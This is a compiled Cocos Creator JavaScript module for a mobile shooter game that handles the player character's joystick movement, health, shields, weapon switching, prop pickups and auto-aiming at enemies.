//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/game/GameRoleController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '6a436jVTaVMhK6DmWGm6kzl', 'GameRoleController');
// script/app/game/GameRoleController.ts

Object.defineProperty(exports, "__esModule", { value: true });
exports.DirectionType = exports.JoystickType = void 0;
var BulletEmitterShanDianQiu_1 = require("../entities/bulletEmitter/BulletEmitterShanDianQiu");
var BulletEmitterHuoJianTong_1 = require("../entities/bulletEmitter/BulletEmitterHuoJianTong");
var BulletEmitterShouQiang_1 = require("../entities/bulletEmitter/BulletEmitterShouQiang");
var BulletEmitterSanDanQiang_1 = require("../entities/bulletEmitter/BulletEmitterSanDanQiang");
var Role_1 = require("../entities/role/Role");
var Actions_1 = require("../../../framework/actions/Actions");
var BulletEmitterJiGuang_1 = require("../entities/bulletEmitter/BulletEmitterJiGuang");
var BulletEmitterLiZiPao_1 = require("../entities/bulletEmitter/BulletEmitterLiZiPao");
var BulletEmitterJiaTeLin_1 = require("../entities/bulletEmitter/BulletEmitterJiaTeLin");
var BulletEmitterJuJiQiang_1 = require("../entities/bulletEmitter/BulletEmitterJuJiQiang");
var BulletEmitterHuoYan_1 = require("../entities/bulletEmitter/BulletEmitterHuoYan");
var BulletEmitter_1 = require("../entities/bulletEmitter/BulletEmitter");
var BulletEmitterPenZi_1 = require("../entities/bulletEmitter/BulletEmitterPenZi");
var GameProxy_1 = require("./GameProxy");
var Enemy_1 = require("../entities/enemy/Enemy");
var BulletOfFangHuDun_1 = require("../entities/bullet/BulletOfFangHuDun");
var PropStateController_1 = require("../entities/prop/PropStateController");
var Music_1 = require("../../../framework/audio/Music");
var World_1 = require("../info/World");
var ExcelConfig_1 = require("../../../framework/config/ExcelConfig");
var ExcelTableNames_1 = require("../config/ExcelTableNames");
var GameController_1 = require("./GameController");
var Extend_1 = require("../../../framework/extend/Extend");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var JoystickType;
(function (JoystickType) {
    JoystickType[JoystickType["FIXED"] = 0] = "FIXED";
    JoystickType[JoystickType["FOLLOW"] = 1] = "FOLLOW";
})(JoystickType = exports.JoystickType || (exports.JoystickType = {}));
var DirectionType;
(function (DirectionType) {
    DirectionType[DirectionType["FOUR"] = 4] = "FOUR";
    DirectionType[DirectionType["EIGHT"] = 8] = "EIGHT";
    DirectionType[DirectionType["ALL"] = 0] = "ALL";
})(DirectionType = exports.DirectionType || (exports.DirectionType = {}));
var RING_OPACITY = 80;
var EmitterSfxVolumes = [0.33, 0.8, 0.8, 0.45, 1, 2, 1, 0.6, 1, 2, 1, 1, 1];
var GameRoleController = /** @class */ (function (_super) {
    __extends(GameRoleController, _super);
    function GameRoleController() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.guideNode = null;
        _this.bulletStrikeLayer = null;
        _this.propStatePrefab = null;
        _this.propStateNode = null;
        _this.takePropLayer = null;
        _this.beAttackSke = null;
        _this.weaponSke = null;
        _this.payloadLabel = null;
        _this.payloadBars = [];
        _this.hpProgressBar = null;
        _this.hpBarNode = null;
        _this.bgLayer = null;
        _this.dot = null;
        _this.ring = null;
        _this.joystickType = JoystickType.FIXED;
        _this.directionType = DirectionType.ALL;
        _this._radius = 0;
        _this._takeProps = [];
        _this.role = null;
        _this.impenetrableDefence = null;
        _this.maxHp = 1000;
        _this._hp = 0;
        _this._bulletEmitter = 0;
        _this._bulletEmitterDelegate = null;
        _this._touchId = null;
        _this._bMove = false;
        _this._dir = cc.v2();
        _this._fireCD = 0;
        _this._bgBounds = cc.rect();
        _this._roleBounds = cc.rect();
        _this._bgNode = null;
        _this._screenRect = cc.rect(0, 0, cc.visibleRect.width, cc.visibleRect.height);
        return _this;
    }
    GameRoleController.prototype.genTakePropNode = function () {
        var prefabPath = 'prefab/entities/prop/takeProp';
        var entityPrefab = cc.loader.getRes(prefabPath, cc.Prefab);
        var node = cc.instantiate(entityPrefab);
        node.active = false;
        this.takePropLayer.addChild(node);
        this._takeProps.push(node);
        return node;
    };
    GameRoleController.prototype.getInactiveTakePropNode = function () {
        var result = this._takeProps.find(function (value) { return value.active == false; });
        if (typeof result == "undefined") {
            result = this.genTakePropNode();
        }
        return result;
    };
    Object.defineProperty(GameRoleController.prototype, "hp", {
        get: function () {
            return this._hp;
        },
        set: function (value) {
            var _this = this;
            if (this.impenetrableDefence.node.active) {
                //减速
                this.impenetrableDefence.strike(null, null);
                return;
            }
            if (this._hp <= 0)
                return;
            var damage = this._hp - value;
            window['GameLabelsController'].fly("-" + Extend_1.ext.shortFormat(damage), this.role.node.position.add(cc.v2(0, this.role.spaceCircleCollider.radius)));
            this._hp = value;
            if (value <= 0) {
                GameProxy_1.GameProxy.emit(GameProxy_1.GameProxy.Event.KillRole);
            }
            this.updateHpProgress();
            this.beAttackSke.node.active = true;
            this.beAttackSke.setAnimation(0, "crazy", false);
            Music_1.Music.playSFX("sound/msc_rol001");
            this.hpBarNode.color = cc.Color.RED;
            this.role.spriteNode.color = cc.Color.RED;
            var action = cc.sequence(cc.delayTime(0.2), cc.callFunc(function () {
                _this.hpBarNode.color = cc.Color.GREEN;
                _this.role.spriteNode.color = cc.Color.WHITE;
            }));
            action.setTag(901);
            this.role.node.stopActionByTag(901);
            this.role.node.runAction(action);
        },
        enumerable: false,
        configurable: true
    });
    GameRoleController.prototype.huiXue = function (add) {
        this._hp += add;
        if (this._hp > this.maxHp) {
            this._hp = this.maxHp;
        }
        this.updateHpProgress();
    };
    GameRoleController.prototype.updateHpProgress = function () {
        this.hpProgressBar.progress = this._hp / this.maxHp;
    };
    Object.defineProperty(GameRoleController.prototype, "bulletEmitter", {
        get: function () {
            return this._bulletEmitter;
        },
        set: function (value) {
            if (this._bulletEmitter != 0) {
                Music_1.Music.playSFX("sound/msc_rol003");
            }
            if (this._bulletEmitter != value) {
                this._bulletEmitter = value;
                var gameBulletsController = window['GameBulletsController'];
                var bulletEmitter = null;
                switch (this._bulletEmitter) {
                    case BulletEmitter_1.default.TYPES.ShouQiang:
                        bulletEmitter = new BulletEmitterShouQiang_1.default(gameBulletsController);
                        break;
                    case BulletEmitter_1.default.TYPES.PenZi:
                        bulletEmitter = new BulletEmitterPenZi_1.default(gameBulletsController);
                        break;
                    case BulletEmitter_1.default.TYPES.JiaTeLin:
                        bulletEmitter = new BulletEmitterJiaTeLin_1.default(gameBulletsController);
                        break;
                    case BulletEmitter_1.default.TYPES.SanDanQiang:
                        bulletEmitter = new BulletEmitterSanDanQiang_1.default(gameBulletsController);
                        break;
                    case BulletEmitter_1.default.TYPES.JuJiQiang:
                        bulletEmitter = new BulletEmitterJuJiQiang_1.default(gameBulletsController);
                        break;
                    case BulletEmitter_1.default.TYPES.LiZiPao:
                        bulletEmitter = new BulletEmitterLiZiPao_1.default(gameBulletsController);
                        break;
                    case BulletEmitter_1.default.TYPES.HuoJianTong:
                        bulletEmitter = new BulletEmitterHuoJianTong_1.default(gameBulletsController);
                        break;
                    case BulletEmitter_1.default.TYPES.ShanDianQiu:
                        bulletEmitter = new BulletEmitterShanDianQiu_1.default(gameBulletsController);
                        break;
                    case BulletEmitter_1.default.TYPES.JiGuang:
                        bulletEmitter = new BulletEmitterJiGuang_1.default(gameBulletsController);
                        break;
                    case BulletEmitter_1.default.TYPES.HuoYan:
                        bulletEmitter = new BulletEmitterHuoYan_1.default(gameBulletsController);
                        break;
                }
                this.bulletEmitterDelegate = bulletEmitter;
                bulletEmitter.init(this._bulletEmitter);
                // this.weaponSke.node.scale = 0;
                // this.weaponSke.node.runAction(cc.scaleTo(0.35, 0.55).easing(cc.easeBackOut()));
                this.weaponSke.setSkin(("000" + this._bulletEmitter).substr(-3));
                this.weaponSke.setAnimation(0, "gun_002", false);
            }
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(GameRoleController.prototype, "bulletEmitterDelegate", {
        get: function () {
            return this._bulletEmitterDelegate;
        },
        set: function (value) {
            if (this._bulletEmitterDelegate) {
                this._bulletEmitterDelegate.onExit();
            }
            this._bulletEmitterDelegate = value;
            this._bulletEmitterDelegate.onEnter();
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(GameRoleController.prototype, "touchId", {
        set: function (value) {
            this._touchId = value;
            // if (this._touchId == null){
            //     GameProxy.slowGame = true;
            // } else {
            //     GameProxy.slowGame = false;
            // }
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(GameRoleController.prototype, "dir", {
        get: function () {
            return this._dir;
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(GameRoleController.prototype, "bMove", {
        get: function () {
            return this._bMove;
        },
        enumerable: false,
        configurable: true
    });
    GameRoleController.prototype.onLoad = function () {
        var _this = this;
        this._radius = this.ring.width / 2;
        if (this.joystickType == JoystickType.FOLLOW) {
            this.ring.opacity = 0;
            this.dot.opacity = 0;
        }
        this.role.node.on(cc.Node.EventType.POSITION_CHANGED, this.onRolePositionChanged, this);
        this.node.on(GameProxy_1.GameProxy.Event.PauseGame, this.onPauseGame, this);
        this.node.on(GameProxy_1.GameProxy.Event.InitGame, this.onInitGame, this);
        this.node.on(GameProxy_1.GameProxy.Event.StartGame, this.onStartGame, this);
        this.node.on(GameProxy_1.GameProxy.Event.ReliveGame, this.onReliveGame, this);
        this.node.on(GameProxy_1.GameProxy.Event.UpdateBulletCount, this.onUpdateBulletCount, this);
        this.node.on(GameProxy_1.GameProxy.Event.PropTrigger, this.onPropTrigger, this);
        this.node.on(GameProxy_1.GameProxy.Event.PropCDZero, this.onPropCDZero, this);
        this.beAttackSke.setCompleteListener(function (trackEntry, loopCount) {
            var name = trackEntry.animation ? trackEntry.animation.name : '';
            _this.beAttackSke.node.active = false;
        });
        this.beAttackSke.node.active = false;
        this.beAttackSke.node.scaleY = cc.view.getVisibleSize().height / 1334;
        this.weaponSke.setCompleteListener(function (trackEntry, loopCount) {
            var name = trackEntry.animation ? trackEntry.animation.name : '';
            if (name == 'gun_002') {
                _this.weaponSke.setAnimation(0, "gun", false);
            }
        });
        window['GameRoleController'] = this;
    };
    GameRoleController.prototype.onUpdateBulletCount = function () {
        var str = "x" + this._bulletEmitterDelegate.bulletCount;
        if (this._bulletEmitter == 1) {
            str = '∞';
        }
        this.payloadLabel.string = str;
        var num = this.payloadBars.length;
        if (this._bulletEmitterDelegate.payload > 0) {
            num = Math.ceil(this._bulletEmitterDelegate.bulletCount / this._bulletEmitterDelegate.payload * this.payloadBars.length);
        }
        this.payloadBars.forEach(function (value, index) { return value.active = index < num; });
    };
    GameRoleController.prototype.onPauseGame = function (pause) {
        if (pause) {
            this.touchId = null;
            this._bMove = false;
            this.dot.setPosition(this.ring.getPosition());
            if (this.joystickType == JoystickType.FOLLOW) {
                this.ring.opacity = 0;
                this.dot.opacity = 0;
            }
        }
    };
    GameRoleController.prototype.onInitGame = function () {
        this.maxHp = this._hp = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.WeaponUp)[World_1.World.Storage.HpLv - 1]['life'];
        this.updateHpProgress();
        this.setImpenetrableDefenceCD(3);
    };
    GameRoleController.prototype.setImpenetrableDefenceCD = function (cd) {
        var _this = this;
        console.log("setImpenetrableDefenceCD==>", cd);
        this.impenetrableDefence.node.active = true;
        this.impenetrableDefence.unblink();
        var action = cc.sequence(cc.delayTime(cd - 1), cc.callFunc(function () {
            _this.impenetrableDefence.blink();
        }), cc.delayTime(1), cc.callFunc(function () {
            _this.impenetrableDefence.node.active = false;
        }));
        action.setTag(889);
        this.role.node.stopActionByTag(889);
        this.role.node.runAction(action);
    };
    GameRoleController.prototype.onStartGame = function () {
        console.log("onStartGame===>", GameProxy_1.GameProxy.pauseGame);
        this.node.on(cc.Node.EventType.TOUCH_START, this.onTouchStart, this);
        this.node.on(cc.Node.EventType.TOUCH_MOVE, this.onTouchMove, this);
        this.node.on(cc.Node.EventType.TOUCH_END, this.onTouchEnd, this);
        this.node.on(cc.Node.EventType.TOUCH_CANCEL, this.onTouchEnd, this);
        if (!World_1.World.My.newbies.state("FirstEntryGame")) {
            this.guideNode.active = true;
        }
        else {
            this.getComponent(GameController_1.default).startGenerating();
        }
    };
    GameRoleController.prototype.onReliveGame = function () {
        this.onInitGame();
        var weaponConfig = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Weapon).filter(function (value) { return value['id'] != 1; }).sort((function (a, b) { return b['unlock'] - a['unlock']; }));
        for (var _i = 0, weaponConfig_1 = weaponConfig; _i < weaponConfig_1.length; _i++) {
            var item = weaponConfig_1[_i];
            if (GameProxy_1.GameProxy.level >= item['unlock']) {
                this.bulletEmitter = item['id'];
                this.bulletEmitterDelegate.payload = this.bulletEmitterDelegate.payload * 3;
                break;
            }
        }
    };
    GameRoleController.prototype.onRolePositionChanged = function () {
        var _this = this;
        this.hpProgressBar.node.position = this.role.node.position;
        this._takeProps.forEach(function (value) {
            if (value.active) {
                value.position = _this.role.node.position;
            }
        });
    };
    GameRoleController.prototype.onPropTrigger = function (prop) {
        var _this = this;
        var takePropNode = this.getInactiveTakePropNode();
        takePropNode.position = this.role.node.position;
        takePropNode.active = true;
        takePropNode.scale = 1;
        takePropNode.opacity = 255;
        takePropNode.runAction(cc.sequence(cc.scaleTo(0.3, 4), cc.fadeTo(0.3, 80), cc.callFunc(function () {
            takePropNode.active = false;
        })));
        var propID = prop.propID;
        var propMove = function (callback) {
            var propBaseNode = cc.instantiate(prop.node);
            propBaseNode.position = _this.propStateNode.getParent().convertToNodeSpaceAR(prop.node.convertToWorldSpaceAR(cc.v2()));
            _this.propStateNode.getParent().addChild(propBaseNode);
            /** 飞到状态栏的位置 */
            var flyDuration = 0.3;
            var propStateNode = cc.instantiate(_this.propStatePrefab);
            _this.propStateNode.addChild(propStateNode);
            propStateNode.scale = 0;
            propStateNode.runAction(cc.scaleTo(flyDuration, 1));
            propBaseNode.runAction(cc.sequence(cc.moveTo(flyDuration, _this.propStateNode.position.add(cc.v2(0, -78 / 2))), cc.callFunc(function () {
                _this.propStateNode.children.forEach(function (value) {
                    var propStateConroller = value.getComponent(PropStateController_1.default);
                    if (propStateConroller.propID == propID && value != propStateNode) {
                        propStateConroller.cdTimer.pause = true;
                        propStateConroller.node.active = false;
                    }
                });
                var propStateConroller = propStateNode.getComponent(PropStateController_1.default);
                propStateConroller.init(propID);
                propStateConroller.cdTimer.pause = false;
                propBaseNode.destroy();
                if (callback) {
                    callback();
                }
            })));
        };
        switch (propID) {
            case 5:
                this.setImpenetrableDefenceCD(10 + 0.3);
                break;
            case 11:
                this.role.addSupply(propID);
                this.huiXue(Math.floor(this.maxHp * 0.3));
                break;
            case 9:
                this.role.addSupply(propID);
                propMove();
                this.role.accSpeed = 1.5;
                break;
            case 10:
                propMove();
                break;
            case 12:
                this.role.addSupply(propID);
                propMove();
                GameProxy_1.GameProxy.goldMul = 2;
                break;
            case 13:
                GameProxy_1.GameProxy.magnetic = true;
                propMove();
                break;
            case 102:
            case 103:
            case 104:
            case 105:
            case 106:
            case 107:
            case 108:
            case 109:
            case 110:
                if (this.bulletEmitter == propID - 100) {
                    this.bulletEmitterDelegate.bulletCount = this.bulletEmitterDelegate.payload;
                }
                else {
                    this.bulletEmitter = propID - 100;
                }
                break;
        }
    };
    GameRoleController.prototype.onPropCDZero = function (id) {
        switch (id) {
            case 5:
                this.impenetrableDefence.node.active = false;
                break;
            case 9:
                this.role.accSpeed = 1;
                break;
            case 10:
                break;
            case 12:
                GameProxy_1.GameProxy.goldMul = 1;
                break;
            case 13:
                GameProxy_1.GameProxy.magnetic = false;
                break;
        }
    };
    GameRoleController.prototype.start = function () {
        var _this = this;
        var bgNode = this.role.node.getParent();
        this._bgNode = bgNode;
        this._roleBounds.x = -bgNode.width / 2 + this.role.spaceCircleCollider.radius;
        this._roleBounds.y = -bgNode.height / 2 + this.role.spaceCircleCollider.radius;
        this._roleBounds.width = bgNode.width - this.role.spaceCircleCollider.radius * 2;
        this._roleBounds.height = bgNode.height - this.role.spaceCircleCollider.radius * 2;
        this._bgBounds.x = -this.bgLayer.width / 2 + cc.view.getVisibleSize().width / 2;
        this._bgBounds.y = -this.bgLayer.height / 2 + cc.view.getVisibleSize().height / 2;
        this._bgBounds.width = this.bgLayer.width - cc.view.getVisibleSize().width;
        this._bgBounds.height = this.bgLayer.height - cc.view.getVisibleSize().height;
        // console.log(this._roleBounds, "this._roleBounds===>");
        // let node = new cc.Node();
        // bgNode.addChild(node);
        // let graphic = node.addComponent(cc.Graphics);
        // graphic.strokeColor = cc.Color.RED;
        // graphic.lineWidth = 5;
        // graphic.rect(-bgNode.width/2, -bgNode.height/2, bgNode.width, bgNode.height);
        // graphic.stroke();
        //
        // graphic = this.role.node.addComponent(cc.Graphics);
        // graphic.strokeColor = cc.Color.RED;
        // graphic.lineWidth = 3;
        // graphic.circle(this.role.spaceCircleCollider.offset.x, this.role.spaceCircleCollider.offset.y, this.role.spaceCircleCollider.radius);
        // graphic.stroke();
        /** 移动控制 */
        this.node.runAction(Actions_1.default.update(function (dt) {
            /**
             * 角色移动
             * 有控制的情况下才能移动
             * 小于边界内才能移动
             * */
            var roleMoveLen = _this.role.speed * dt;
            if (_this._bMove && !GameProxy_1.GameProxy.pauseGame) {
                var deltaPos = _this._dir.mul(roleMoveLen);
                var destPos = _this.role.node.position.add(deltaPos);
                var arr = [];
                window['GameCollisionController'].looseQuadTree.retrieve(_this.role.roleAABB.aabb(), arr);
                var flag = false;
                for (var _i = 0, arr_1 = arr; _i < arr_1.length; _i++) {
                    var aabbRegion = arr_1[_i];
                    var enemy = aabbRegion.enemy;
                    if (enemy.node.position.sub(destPos).mag() < enemy.spaceCircleCollider.radius + _this.role.spaceCircleCollider.radius) {
                        flag = true;
                        break;
                    }
                }
                if (!flag) {
                    if (destPos.x > _this._roleBounds.xMax || destPos.x < _this._roleBounds.xMin || destPos.y > _this._roleBounds.yMax || destPos.y < _this._roleBounds.yMin) {
                        flag = true;
                    }
                }
                if (!flag) {
                    _this.role.node.position = destPos;
                }
                /*if (deltaPos.x > 0){
                    if (destPos.x > this._roleBounds.xMax){
                        destPos.x = this._roleBounds.xMax;
                    }
                }else if (deltaPos.x < 0){
                    if (destPos.x < this._roleBounds.xMin){
                        destPos.x = this._roleBounds.xMin;
                    }
                }

                if (deltaPos.y > 0){
                    if (destPos.y > this._roleBounds.yMax){
                        destPos.y = this._roleBounds.yMax;
                    }
                }else if (deltaPos.y < 0){
                    if (destPos.y < this._roleBounds.yMin){
                        destPos.y = this._roleBounds.yMin;
                    }
                }*/
                // let intersections = [];
                // /** 求线段与边线的交点 */
                // if (deltaPos.x > 0 && destPos.x > this._roleBounds.xMax){
                //     //与右边界的交点
                //     let point = cc.v2();
                //     if(cc.Intersection.pLineIntersect(this.role.node.position, destPos, cc.v2(this._roleBounds.xMax, this._roleBounds.yMin), cc.v2(this._roleBounds.xMax, this._roleBounds.yMax), point)){
                //         intersections.push(point);
                //     }
                // }
                // if (deltaPos.x < 0 && destPos.x < this._roleBounds.xMin){
                //     //与左边界的交点
                //     let point = cc.v2();
                //     if(cc.Intersection.pLineIntersect(this.role.node.position, destPos, cc.v2(this._roleBounds.xMin, this._roleBounds.yMin), cc.v2(this._roleBounds.xMin, this._roleBounds.yMax), point)){
                //         intersections.push(point);
                //     }
                // }
                // if (deltaPos.y > 0 && destPos.y > this._roleBounds.yMax){
                //     //与上边界的交点
                //     let point = cc.v2();
                //     if(cc.Intersection.pLineIntersect(this.role.node.position, destPos, cc.v2(this._roleBounds.xMin, this._roleBounds.yMax), cc.v2(this._roleBounds.xMax, this._roleBounds.yMax), point)){
                //         intersections.push(point);
                //     }
                // }
                // if (deltaPos.y < 0 && destPos.y < this._roleBounds.yMin){
                //     //与下边界的交点
                //     let point = cc.v2();
                //     if(cc.Intersection.pLineIntersect(this.role.node.position, destPos, cc.v2(this._roleBounds.xMin, this._roleBounds.yMin), cc.v2(this._roleBounds.xMax, this._roleBounds.yMin), point)){
                //         intersections.push(point);
                //     }
                // }
                /** 求线段与圆的交点 */
                // arr.forEach(value => {
                //     let enemy = value.getComponent(Enemy);
                //     // cc.Intersection.pLineCircle(this.role.node.position, destPos, {position:enemy.node.position, radius:enemy.spaceCircleCollider.radius}, intersections);
                //     let doubleRadius = enemy.spaceCircleCollider.radius + this.role.spaceCircleCollider.radius;
                //     if (cc.Intersection.pointLineDistance(enemy.node.position, this.role.node.position, destPos, true) < doubleRadius){
                //         console.log("与怪物相交，求最小移动距离");
                //         /** 距离 */
                //         let centerSub = enemy.node.position.sub(this.role.node.position);
                //         let centerLen = centerSub.mag();
                //         if (centerLen > doubleRadius){
                //             /** 求夹角 */
                //             let radians = destPos.angle(centerSub);
                //             if (radians > 0){
                //                 /** 求垂线 */
                //                 let vLen = centerLen * Math.sin(radians);
                //                 if (vLen < doubleRadius){
                //                     let sideLen = Math.sqrt(doubleRadius*doubleRadius - vLen*vLen);
                //                     let hLen = centerLen * Math.cos(radians);
                //                     intersections.push(this.node.position.add(this._dir.mul(hLen - sideLen)));
                //                 }
                //             } else {
                //                 intersections.push(this.node.position.add(this._dir.mul(centerLen - doubleRadius)));
                //             }
                //         }
                //     }
                // });
                // if (intersections.length > 0){
                //     console.log(intersections, "intersections..");
                //     if (intersections.length == 1){
                //         let t = cc.v2();
                //         this.role.node.position = intersections[0].addSelf(this._dir.neg(t));
                //     }else {
                //         /** 求距离role最近的那个 */
                //         let p = intersections[0];
                //         let minDistance = p.sub(this.role.node.position).mag();
                //         for (let i=1; i<intersections.length; i++){
                //             let mag = intersections[i].sub(this.role.node.position).mag();
                //             if (mag < minDistance){
                //                 p = intersections[i];
                //                 minDistance = mag;
                //             }
                //         }
                //         let t = cc.v2();
                //         this.role.node.position = p.addSelf(this._dir.neg(t));
                //     }
                // } else {
                //     this.role.node.position = destPos;
                // }
            }
            /**
             * 地图的移动
             * --它的移动速度比角色要慢一点
             * --要保证角色的点在屏幕中心
             * */
            var sub = cc.v2(-_this.role.node.x, -_this.role.node.y).sub(bgNode.position);
            var mag = sub.mag();
            var normalize = sub.normalize();
            if (mag > 0) {
                var speed = roleMoveLen * (mag > 50 ? 1 : 5 / 6);
                var x = speed * normalize.x;
                var y = speed * normalize.y;
                if (Math.abs(x) > Math.abs(sub.x)) {
                    x = sub.x;
                }
                if (Math.abs(y) > Math.abs(sub.y)) {
                    y = sub.y;
                }
                var destX = bgNode.x + x;
                var destY = bgNode.y + y;
                if (destX < _this._bgBounds.xMin) {
                    destX = _this._bgBounds.xMin;
                }
                else if (destX > _this._bgBounds.xMax) {
                    destX = _this._bgBounds.xMax;
                }
                if (destY < _this._bgBounds.yMin) {
                    destY = _this._bgBounds.yMin;
                }
                else if (destY > _this._bgBounds.yMax) {
                    destY = _this._bgBounds.yMax;
                }
                bgNode.x = destX;
                bgNode.y = destY;
            }
        }));
        var gameEnemysController = window['GameEnemysController'];
        if (GameProxy_1.GameProxy.prepareGun > 0) {
            this.bulletEmitter = GameProxy_1.GameProxy.prepareGun;
            this.bulletEmitterDelegate.payload = this.bulletEmitterDelegate.payload * 3;
            GameProxy_1.GameProxy.prepareGun = 0;
        }
        else {
            this.bulletEmitter = BulletEmitter_1.default.TYPES.ShouQiang;
        }
        /** 发射控制 */
        this.node.runAction(Actions_1.default.update(function (dt) {
            if (GameProxy_1.GameProxy.pauseGame || GameProxy_1.GameProxy.slowGame)
                return;
            if (_this._fireCD > 0) {
                _this._fireCD -= dt;
            }
            /** 找到离角度最近的敌人 */
            var enemyNode = null;
            var minSub = null;
            var minDistance = _this.bulletEmitterDelegate.firingRange;
            // console.log(minDistance, "minDistance");
            _this._screenRect.x = -_this._bgNode.x - cc.visibleRect.center.x;
            _this._screenRect.y = -_this._bgNode.y - cc.visibleRect.center.y;
            var rolePos = _this.role.node.position;
            gameEnemysController.enemyLayer.children.forEach(function (value) {
                if (value.active && value.getComponent(Enemy_1.default).hp > 0 && _this._screenRect.contains(value.position)) {
                    var sub = value.position.sub(rolePos);
                    var mag = sub.mag();
                    if (mag < minDistance) {
                        minSub = sub;
                        minDistance = mag;
                        enemyNode = value;
                    }
                }
            });
            if (enemyNode) {
                /** 转向敌人 */
                _this.turnTo(minSub);
                if (_this._fireCD <= 0) {
                    /** 根据攻击距离计算攻击夹角 */
                    var attackRadian = Math.atan(enemyNode.getComponent(Enemy_1.default).spaceCircleCollider.radius / minDistance);
                    if (minSub.angle(cc.v2(0, 1).rotate(cc.misc.degreesToRadians(-_this.role.node.rotation))) < attackRadian) {
                        /** fire */
                        _this._fireCD = _this.bulletEmitterDelegate.interval;
                        var dir = enemyNode.position.sub(rolePos).normalize();
                        if (dir.x == 0 && dir.y == 0) {
                            dir = cc.v2(0, 1).normalize().rotate(cc.misc.degreesToRadians(-_this.role.node.rotation));
                        }
                        if (_this._bulletEmitter == BulletEmitter_1.default.TYPES.JuJiQiang) {
                            var bulletStrikePrefab = cc.loader.getRes("prefab/entities/bullet/fire7");
                            var bulletStrikeNode_1 = cc.instantiate(bulletStrikePrefab);
                            _this.bulletStrikeLayer.addChild(bulletStrikeNode_1);
                            bulletStrikeNode_1.position = _this.role.node.position.add(dir.mul(_this.role.gunTopNode.y));
                            bulletStrikeNode_1.rotation = 90 - cc.misc.radiansToDegrees(Math.atan2(dir.y, dir.x));
                            bulletStrikeNode_1.getComponent(sp.Skeleton).setCompleteListener(function () {
                                bulletStrikeNode_1.destroy();
                            });
                        }
                        else if (_this._bulletEmitter !== BulletEmitter_1.default.TYPES.JiGuang && _this._bulletEmitter !== BulletEmitter_1.default.TYPES.PenZi) {
                            _this.role.fireSprite.node.scale = 1;
                            _this.role.fireSprite.node.active = true;
                            _this.role.fireSprite.node.runAction(cc.sequence(cc.scaleTo(0.05, 0.5), cc.callFunc(function () {
                                _this.role.fireSprite.node.active = false;
                            })));
                        }
                        _this._bulletEmitterDelegate.fire(_this.role.node.position.add(dir.mul(_this.role.gunTopNode.y)), dir);
                        var str = 'sound/msc_g' + ("0000000000000000" + _this._bulletEmitter).substr(-3);
                        Music_1.Music.playSFX(str, EmitterSfxVolumes[_this._bulletEmitter - 1]);
                        if (_this._bulletEmitterDelegate.isUseUp()) {
                            _this.bulletEmitter = BulletEmitter_1.default.TYPES.ShouQiang;
                        }
                    }
                }
            }
        }));
    };
    GameRoleController.prototype.turnTo = function (dir) {
        var degree = (90 - cc.misc.radiansToDegrees(Math.atan2(dir.y, dir.x))) % 360;
        // console.log("de===>", degree);
        // console.log("dir===>x="+dir.x+" y="+dir.y);
        if (degree < 0) {
            degree += 360;
        }
        var enemyRotation = this.role.node.rotation % 360;
        if (enemyRotation < 0) {
            enemyRotation += 360;
        }
        var subDegree = Math.abs(degree - enemyRotation);
        // console.log("degree="+degree);
        // console.log("enemyRotation====>"+enemyRotation);
        if (subDegree > 0) {
            var rotation = 0;
            if (subDegree > 180) {
                rotation = Math.sign(enemyRotation - degree) * 10;
                if (Math.abs(rotation) > 360 - subDegree) {
                    rotation = Math.sign(rotation) * (360 - subDegree);
                }
            }
            else {
                rotation = Math.sign(degree - enemyRotation) * 10;
                if (Math.abs(rotation) > subDegree) {
                    rotation = Math.sign(rotation) * subDegree;
                }
            }
            enemyRotation += rotation;
        }
        this.role.node.rotation = enemyRotation;
    };
    GameRoleController.prototype.onDestroy = function () {
        this.node.off(cc.Node.EventType.TOUCH_START, this.onTouchStart, this);
        this.node.off(cc.Node.EventType.TOUCH_MOVE, this.onTouchMove, this);
        this.node.off(cc.Node.EventType.TOUCH_END, this.onTouchEnd, this);
        this.node.off(cc.Node.EventType.TOUCH_CANCEL, this.onTouchEnd, this);
    };
    GameRoleController.prototype.onTouchStart = function (event) {
        // console.log("onTouchStart===>", this._touchId, GameProxy.pauseGame);
        if (this._touchId == null) {
            this.touchId = event.getID();
            this._bMove = false;
            this.ring.opacity = RING_OPACITY;
            this.dot.opacity = RING_OPACITY;
            // 更改摇杆的位置
            this.ring.setPosition(event.getLocation().sub(cc.visibleRect.center));
            this.dot.setPosition(cc.v2(0, 0));
        }
    };
    GameRoleController.prototype.onTouchMove = function (event) {
        // console.log("onTouchMove===>", this._touchId, GameProxy.pauseGame);
        if (!GameProxy_1.GameProxy.pauseGame && event.getID() == this._touchId) {
            this._bMove = true;
            if (this.guideNode.active && this.dot.position.mag() > 30) {
                this.guideNode.active = false;
                World_1.World.My.newbies.finish("FirstEntryGame");
                this.getComponent(GameController_1.default).startGenerating();
            }
            var pos = this.dot.position.add(event.getDelta());
            this._dir = pos.normalize();
            if (pos.mag() >= this._radius) {
                this.dot.position = this._dir.mul(this._radius);
                this.role.speedType = Role_1.SpeedType.FAST;
                this.ring.position = event.getLocation().sub(cc.visibleRect.center).sub(this.dot.position);
            }
            else {
                this.dot.position = pos;
                this.role.speedType = Role_1.SpeedType.NORMAL;
            }
        }
    };
    GameRoleController.prototype.onTouchEnd = function (event) {
        // console.log("onTouchEnd===>", this._touchId, GameProxy.pauseGame);
        if (!GameProxy_1.GameProxy.pauseGame && event.getID() == this._touchId) {
            this.touchId = null;
            this._bMove = false;
            this.dot.setPosition(this.ring.getPosition());
            if (this.joystickType == JoystickType.FOLLOW) {
                this.ring.opacity = 0;
                this.dot.opacity = 0;
            }
            // this.role.speedType = SpeedType.STOP;
        }
    };
    __decorate([
        property(cc.Node)
    ], GameRoleController.prototype, "guideNode", void 0);
